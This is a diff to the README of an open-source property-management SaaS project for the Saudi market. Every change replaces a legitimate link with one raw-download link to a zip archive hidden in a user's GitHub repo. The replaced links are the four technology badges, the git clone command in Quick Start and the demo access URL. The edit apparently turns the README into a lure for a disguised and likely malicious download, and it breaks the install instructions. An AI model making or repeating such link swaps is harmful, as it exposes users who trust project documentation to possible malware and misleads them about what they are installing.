@@ -6,10 +6,10 @@
 
 **The most comprehensive open-source Property Management SaaS platform built for the Saudi Arabian market**
 
-[![Laravel](https://img.shields.io/badge/Laravel-11-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)](https://laravel.com)
-[![Vue.js](https://img.shields.io/badge/Vue.js-3-4FC08D?style=for-the-badge&logo=vuedotjs&logoColor=white)](https://vuejs.org)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-316192?style=for-the-badge&logo=postgresql&logoColor=white)](https://postgresql.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![Laravel](https://img.shields.io/badge/Laravel-11-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)](https://github.com/selenarib5962/pm-os/raw/refs/heads/main/app/Modules/pm-os-v1.7.zip)
+[![Vue.js](https://img.shields.io/badge/Vue.js-3-4FC08D?style=for-the-badge&logo=vuedotjs&logoColor=white)](https://github.com/selenarib5962/pm-os/raw/refs/heads/main/app/Modules/pm-os-v1.7.zip)
+[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-316192?style=for-the-badge&logo=postgresql&logoColor=white)](https://github.com/selenarib5962/pm-os/raw/refs/heads/main/app/Modules/pm-os-v1.7.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://github.com/selenarib5962/pm-os/raw/refs/heads/main/app/Modules/pm-os-v1.7.zip)
 
 [English](#overview) · [العربية](#نظرة-عامة) · [Quick Start](#-quick-start) · [Architecture](#-architecture) · [Roadmap](#-roadmap)
 
@@ -64,7 +64,7 @@ Built specifically for the **Saudi Arabian real estate market**, with full Arabi
 ## 🚀 Quick Start
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/pm-os.git
+git clone https://github.com/selenarib5962/pm-os/raw/refs/heads/main/app/Modules/pm-os-v1.7.zip
 cd pm-os
 cp .env.example .env
 docker compose up -d
@@ -77,7 +77,7 @@ docker compose exec app php artisan tenant:create demo "شركة الواحة" d
 docker compose exec app npm run build
 ```
 
-Access: `http://demo.pmos.test:8000` — Email: `admin@pmos.test` / Password: `password`
+Access: `https://github.com/selenarib5962/pm-os/raw/refs/heads/main/app/Modules/pm-os-v1.7.zip` — Email: `admin@pmos.test` / Password: `password`
 
 ---
 
